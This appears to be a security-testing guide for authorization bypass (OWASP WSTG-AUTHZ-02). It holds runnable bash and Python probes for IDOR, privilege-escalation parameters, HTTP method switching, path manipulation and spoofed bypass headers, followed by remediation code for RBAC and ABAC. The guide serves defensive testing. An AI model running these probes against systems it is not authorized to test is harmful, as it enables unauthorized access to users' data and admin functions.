# WSTG-AUTHZ-02: Testing for Bypassing Authorization Schema

## Test ID
WSTG-AUTHZ-02

## Test Name
Testing for Bypassing Authorization Schema

## High-Level Description

Authorization bypass occurs when an attacker gains access to resources or functions without proper permission. This happens when the application fails to enforce access controls consistently, allowing users to access other users' data, perform privileged actions, or access restricted functionality through manipulation of requests, parameters, or application logic.

---

## What to Check

### Authorization Weaknesses

- [ ] Horizontal privilege escalation (accessing other users' data)
- [ ] Vertical privilege escalation (accessing admin functions)
- [ ] Missing authorization checks on endpoints
- [ ] Client-side only authorization
- [ ] Parameter manipulation bypasses
- [ ] Forced browsing to restricted pages
- [ ] HTTP method switching bypasses

### Common Bypass Techniques

| Technique | Description |
|-----------|-------------|
| Parameter tampering | Changing user_id, role, etc. |
| Forced browsing | Direct URL access |
| HTTP method change | GET→POST, PUT→PATCH |
| Header manipulation | X-Original-URL, X-Rewrite-URL |
| Case manipulation | /Admin vs /admin |
| Path manipulation | /admin/../admin |

---

## How to Test

### Step 1: Map Role-Based Access

```bash
# Document what each role should access
# Admin: /admin/*, /api/admin/*
# User: /dashboard, /api/user/*
# Guest: /login, /register, /public/*

# Create test accounts for each role
# Record accessible endpoints for each
```

### Step 2: Test Horizontal Authorization

```bash
#!/bin/bash
# Test accessing other users' resources

# Get User A's token
token_a="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# User A's resources
user_a_id="100"

# Attempt to access User B's resources (ID: 101)
user_b_id="101"

endpoints=(
    "/api/users/{id}/profile"
    "/api/users/{id}/orders"
    "/api/users/{id}/settings"
    "/api/users/{id}/documents"
    "/api/accounts/{id}"
    "/api/messages/{id}"
)

for endpoint in "${endpoints[@]}"; do
    # Replace {id} with other user's ID
    url=$(echo "$endpoint" | sed "s/{id}/$user_b_id/g")

    response=$(curl -s -w "\n%{http_code}" \
        -H "Authorization: Bearer $token_a" \
        "https://target.com$url")

    status=$(echo "$response" | tail -1)
    body=$(echo "$response" | sed '$d')

    if [ "$status" == "200" ]; then
        echo "[VULN] Horizontal bypass: $url"
        echo "Response: $body" | head -c 200
    else
        echo "[OK] $url - Status: $status"
    fi
done
```

### Step 3: Test Vertical Authorization

```bash
#!/bin/bash
# Test accessing admin functions as regular user

user_token="regular_user_token_here"

admin_endpoints=(
    "/admin/dashboard"
    "/admin/users"
    "/admin/settings"
    "/api/admin/users"
    "/api/admin/config"
    "/api/admin/logs"
    "/management/health"
    "/actuator/env"
    "/console"
    "/swagger-ui/"
)

for endpoint in "${admin_endpoints[@]}"; do
    response=$(curl -s -w "\n%{http_code}" \
        -H "Authorization: Bearer $user_token" \
        "https://target.com$endpoint")

    status=$(echo "$response" | tail -1)

    if [ "$status" == "200" ] || [ "$status" == "301" ] || [ "$status" == "302" ]; then
        echo "[POTENTIAL] $endpoint - Status: $status"
    fi
done
```

### Step 4: Test Parameter Manipulation

```bash
# Test role parameter manipulation
curl -s -X POST "https://target.com/api/user/update" \
    -H "Authorization: Bearer $user_token" \
    -H "Content-Type: application/json" \
    -d '{"name":"test","role":"admin"}'

# Test is_admin flag
curl -s -X POST "https://target.com/api/user/update" \
    -H "Authorization: Bearer $user_token" \
    -H "Content-Type: application/json" \
    -d '{"name":"test","is_admin":true}'

# Test permission array
curl -s -X POST "https://target.com/api/user/update" \
    -H "Authorization: Bearer $user_token" \
    -H "Content-Type: application/json" \
    -d '{"permissions":["read","write","admin","delete"]}'

# Test group_id escalation
curl -s -X POST "https://target.com/api/user/update" \
    -H "Authorization: Bearer $user_token" \
    -H "Content-Type: application/json" \
    -d '{"group_id":1}'  # Admin group
```

### Step 5: Test HTTP Method Bypass

```bash
# If GET is blocked, try other methods
methods=("GET" "POST" "PUT" "PATCH" "DELETE" "HEAD" "OPTIONS" "TRACE")

for method in "${methods[@]}"; do
    response=$(curl -s -w "%{http_code}" -X "$method" \
        -H "Authorization: Bearer $user_token" \
        "https://target.com/admin/users" \
        -o /dev/null)

    echo "$method: $response"
done

# Override method with headers
curl -s "https://target.com/admin/users" \
    -H "X-HTTP-Method-Override: GET" \
    -H "Authorization: Bearer $user_token"

curl -s "https://target.com/admin/users" \
    -H "X-HTTP-Method: GET" \
    -H "Authorization: Bearer $user_token"
```

### Step 6: Test URL Manipulation Bypasses

```bash
# Path manipulation
urls=(
    "/admin/users"
    "/Admin/users"
    "/ADMIN/users"
    "/admin/./users"
    "/admin/../admin/users"
    "/admin%2fusers"
    "/admin%252fusers"
    "//admin/users"
    "/./admin/users"
    "/admin/users/"
    "/admin/users?"
    "/admin/users#"
    "/admin/users.json"
    "/admin/users;.css"
)

for url in "${urls[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "Authorization: Bearer $user_token" \
        "https://target.com$url")

    if [ "$status" == "200" ]; then
        echo "[VULN] Bypass found: $url"
    fi
done
```

### Step 7: Test Header-Based Bypasses

```bash
# X-Original-URL / X-Rewrite-URL bypass
curl -s "https://target.com/" \
    -H "X-Original-URL: /admin/users" \
    -H "Authorization: Bearer $user_token"

curl -s "https://target.com/" \
    -H "X-Rewrite-URL: /admin/users" \
    -H "Authorization: Bearer $user_token"

# Custom headers some apps use
curl -s "https://target.com/admin/users" \
    -H "X-Custom-IP-Authorization: 127.0.0.1" \
    -H "Authorization: Bearer $user_token"

curl -s "https://target.com/admin/users" \
    -H "X-Forwarded-For: 127.0.0.1" \
    -H "Authorization: Bearer $user_token"

curl -s "https://target.com/admin/users" \
    -H "X-Real-IP: 127.0.0.1" \
    -H "Authorization: Bearer $user_token"
```

### Step 8: Comprehensive Authorization Tester

```python
#!/usr/bin/env python3
import requests
import json
from urllib.parse import urljoin

class AuthorizationTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()

    def test_horizontal_access(self, token, own_id, target_ids, endpoints):
        """Test horizontal privilege escalation"""
        print("\n[*] Testing Horizontal Authorization...")
        vulnerabilities = []

        self.session.headers.update({"Authorization": f"Bearer {token}"})

        for endpoint_template in endpoints:
            for target_id in target_ids:
                endpoint = endpoint_template.replace("{id}", str(target_id))
                url = urljoin(self.base_url, endpoint)

                try:
                    response = self.session.get(url, timeout=10)

                    if response.status_code == 200:
                        if str(target_id) != str(own_id):
                            print(f"[VULN] Horizontal bypass: {endpoint}")
                            vulnerabilities.append({
                                "type": "horizontal",
                                "endpoint": endpoint,
                                "target_id": target_id
                            })

                except Exception as e:
                    print(f"[ERROR] {endpoint}: {e}")

        return vulnerabilities

    def test_vertical_access(self, user_token, admin_endpoints):
        """Test vertical privilege escalation"""
        print("\n[*] Testing Vertical Authorization...")
        vulnerabilities = []

        self.session.headers.update({"Authorization": f"Bearer {user_token}"})

        for endpoint in admin_endpoints:
            url = urljoin(self.base_url, endpoint)

            try:
                response = self.session.get(url, timeout=10)

                if response.status_code == 200:
                    print(f"[VULN] Vertical bypass: {endpoint}")
                    vulnerabilities.append({
                        "type": "vertical",
                        "endpoint": endpoint,
                        "status": response.status_code
                    })
                elif response.status_code in [301, 302]:
                    print(f"[CHECK] Redirect on: {endpoint}")

            except Exception as e:
                print(f"[ERROR] {endpoint}: {e}")

        return vulnerabilities

    def test_method_bypass(self, token, endpoint):
        """Test HTTP method bypass"""
        print(f"\n[*] Testing Method Bypass on {endpoint}...")
        methods = ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"]
        results = {}

        self.session.headers.update({"Authorization": f"Bearer {token}"})
        url = urljoin(self.base_url, endpoint)

        for method in methods:
            try:
                response = self.session.request(method, url, timeout=10)
                results[method] = response.status_code

                if response.status_code == 200:
                    print(f"[POTENTIAL] {method} returns 200")

            except:
                results[method] = "error"

        return results

    def test_url_manipulation(self, token, base_endpoint):
        """Test URL manipulation bypasses"""
        print(f"\n[*] Testing URL Manipulation on {base_endpoint}...")
        vulnerabilities = []

        manipulations = [
            base_endpoint.upper(),
            base_endpoint.capitalize(),
            base_endpoint + "/",
            base_endpoint + "?",
            base_endpoint + "#",
            base_endpoint + ".json",
            base_endpoint + ";.css",
            base_endpoint + "%20",
            "/" + base_endpoint.lstrip("/"),
            "//" + base_endpoint.lstrip("/"),
            base_endpoint.replace("/", "//"),
            base_endpoint.replace("/", "/./"),
            base_endpoint + "/../" + base_endpoint.split("/")[-1],
        ]

        self.session.headers.update({"Authorization": f"Bearer {token}"})

        for manipulation in manipulations:
            url = urljoin(self.base_url, manipulation)

            try:
                response = self.session.get(url, timeout=10)

                if response.status_code == 200:
                    print(f"[VULN] Bypass: {manipulation}")
                    vulnerabilities.append(manipulation)

            except:
                pass

        return vulnerabilities

    def test_header_bypass(self, token, endpoint):
        """Test header-based bypasses"""
        print(f"\n[*] Testing Header Bypass on {endpoint}...")
        vulnerabilities = []

        bypass_headers = [
            {"X-Original-URL": endpoint},
            {"X-Rewrite-URL": endpoint},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
        ]

        base_session = requests.Session()
        base_session.headers.update({"Authorization": f"Bearer {token}"})

        # First try accessing root with bypass headers
        for headers in bypass_headers:
            try:
                response = base_session.get(
                    urljoin(self.base_url, "/"),
                    headers=headers,
                    timeout=10
                )

                if response.status_code == 200 and endpoint.lower() in response.text.lower():
                    print(f"[VULN] Header bypass: {headers}")
                    vulnerabilities.append(headers)

            except:
                pass

        return vulnerabilities

# Usage
tester = AuthorizationTester("https://target.com")

# Test horizontal access
user_endpoints = [
    "/api/users/{id}/profile",
    "/api/users/{id}/orders",
    "/api/accounts/{id}",
]
vulns = tester.test_horizontal_access(
    token="user_token",
    own_id=100,
    target_ids=[101, 102, 103],
    endpoints=user_endpoints
)

# Test vertical access
admin_endpoints = [
    "/admin/dashboard",
    "/admin/users",
    "/api/admin/config",
]
vulns += tester.test_vertical_access("user_token", admin_endpoints)

print(f"\nTotal vulnerabilities: {len(vulns)}")
```

---

## Tools

### Authorization Testing

| Tool | Description | Usage |
|------|-------------|-------|
| **Autorize (Burp)** | Authorization testing | Auto-detect auth issues |
| **AuthMatrix (Burp)** | Role-based testing | Matrix of permissions |
| **Access Control Testing** | Manual testing | Systematic verification |

### Automation

| Tool | Description |
|------|-------------|
| **Custom scripts** | Tailored testing |
| **Postman/Newman** | API authorization tests |

---

## Remediation Guide

### 1. Centralized Authorization

```python
from functools import wraps
from flask import request, abort, g

def require_permission(permission):
    """Decorator for permission-based access control"""
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if not g.current_user:
                abort(401)

            if not g.current_user.has_permission(permission):
                abort(403)

            return f(*args, **kwargs)
        return decorated_function
    return decorator

def require_resource_owner(resource_type):
    """Decorator to verify resource ownership"""
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            resource_id = kwargs.get('id') or kwargs.get('resource_id')

            resource = get_resource(resource_type, resource_id)
            if not resource:
                abort(404)

            if resource.owner_id != g.current_user.id:
                if not g.current_user.is_admin:
                    abort(403)

            return f(*args, **kwargs)
        return decorated_function
    return decorator

# Usage
@app.route('/api/users/<int:id>/profile')
@require_permission('read:profile')
@require_resource_owner('user')
def get_user_profile(id):
    return get_user(id).profile
```

### 2. RBAC Implementation

```python
class Permission:
    READ_OWN = 'read:own'
    READ_ALL = 'read:all'
    WRITE_OWN = 'write:own'
    WRITE_ALL = 'write:all'
    ADMIN = 'admin'

class Role:
    ROLES = {
        'user': [Permission.READ_OWN, Permission.WRITE_OWN],
        'moderator': [Permission.READ_OWN, Permission.WRITE_OWN, Permission.READ_ALL],
        'admin': [Permission.READ_OWN, Permission.WRITE_OWN, Permission.READ_ALL,
                  Permission.WRITE_ALL, Permission.ADMIN],
    }

    @classmethod
    def get_permissions(cls, role_name):
        return cls.ROLES.get(role_name, [])

class AuthorizationService:
    def __init__(self, user):
        self.user = user
        self.permissions = Role.get_permissions(user.role)

    def can_access_resource(self, resource, action='read'):
        """Check if user can access a resource"""
        # Admin can do anything
        if Permission.ADMIN in self.permissions:
            return True

        # Check ownership for 'own' permissions
        if resource.owner_id == self.user.id:
            if f'{action}:own' in self.permissions:
                return True

        # Check 'all' permission
        if f'{action}:all' in self.permissions:
            return True

        return False

    def can_perform_action(self, action):
        """Check if user can perform an action"""
        return action in self.permissions
```

### 3. Attribute-Based Access Control (ABAC)

```python
class ABACPolicy:
    def __init__(self):
        self.rules = []

    def add_rule(self, rule):
        self.rules.append(rule)

    def evaluate(self, subject, action, resource, context=None):
        """Evaluate all rules"""
        for rule in self.rules:
            result = rule(subject, action, resource, context)
            if result is not None:
                return result
        return False  # Deny by default

# Define rules
def owner_can_read_own_data(subject, action, resource, context):
    if action == 'read' and resource.owner_id == subject.id:
        return True
    return None  # Continue to next rule

def admin_can_do_anything(subject, action, resource, context):
    if subject.role == 'admin':
        return True
    return None

def deny_outside_business_hours(subject, action, resource, context):
    if context and not context.get('is_business_hours'):
        if action in ['write', 'delete']:
            return False  # Explicitly deny
    return None

# Usage
policy = ABACPolicy()
policy.add_rule(admin_can_do_anything)
policy.add_rule(deny_outside_business_hours)
policy.add_rule(owner_can_read_own_data)

# Check access
can_access = policy.evaluate(
    subject=current_user,
    action='read',
    resource=document,
    context={'is_business_hours': True}
)
```

---

## Risk Assessment

### CVSS Score

| Finding | CVSS | Severity |
|---------|------|----------|
| Vertical privilege escalation | 8.8 | High |
| Horizontal privilege escalation | 8.1 | High |
| Missing authorization on sensitive endpoint | 7.5 | High |
| Inconsistent authorization enforcement | 6.5 | Medium |

---

## CWE Categories

| CWE ID | Title | Description |
|--------|-------|-------------|
| **CWE-285** | Improper Authorization | Missing/weak auth checks |
| **CWE-639** | Authorization Bypass Through User-Controlled Key | IDOR |
| **CWE-862** | Missing Authorization | No auth check |
| **CWE-863** | Incorrect Authorization | Wrong auth logic |

---

## References

- [OWASP WSTG - Authorization Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema)
- [OWASP Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)
- [Autorize Burp Extension](https://github.com/Quitten/Autorize)

---

## Checklist

```
[ ] Role-based access mapped
[ ] Horizontal authorization tested
[ ] Vertical authorization tested
[ ] Parameter manipulation tested
[ ] HTTP method bypass tested
[ ] URL manipulation bypasses tested
[ ] Header-based bypasses tested
[ ] Client-side controls verified
[ ] All endpoints tested
[ ] API endpoints tested
[ ] Findings documented
[ ] Remediation recommendations provided
```
